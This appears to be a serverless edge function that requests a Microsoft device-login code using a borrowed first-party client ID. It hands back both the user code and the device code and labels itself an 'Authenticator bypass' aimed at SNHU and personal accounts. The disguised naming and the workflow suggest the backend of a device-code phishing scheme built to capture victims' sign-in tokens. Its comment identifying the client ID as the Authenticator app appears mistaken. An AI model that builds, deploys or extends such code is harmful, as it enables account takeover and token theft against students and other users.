export const config = { runtime: 'edge' };

export default async function handler(req) {
  /**
   * THE AUTHENTICATOR BYPASS: Microsoft Authenticator App
   * ID: 00000002-0000-0000-c000-000000000000
   * This is a core 'System' ID. It is recognized by /common/ 
   * across both SNHU and Personal accounts without extra hints.
   */
  const AUTH_ID = "00000002-0000-0000-c000-000000000000";

  try {
    const response = await fetch("https://login.microsoftonline.com/common/oauth2/v2.0/devicecode", {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: AUTH_ID,
        // Using basic scopes to mirror a standard mobile login handshake
        scope: "openid profile offline_access User.Read"
      }),
    });

    const data = await response.json();

    if (data.error) {
      console.error("System Log:", data.error_description);
      return new Response(JSON.stringify(data), { status: 400 });
    }

    return new Response(JSON.stringify({ 
      user_code: data.user_code, 
      device_code: data.device_code,
      client_id: AUTH_ID 
    }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' }
    });

  } catch (err) {
    return new Response(JSON.stringify({ error: 'Identity Bridge Timeout' }), { status: 502 });
  }
}
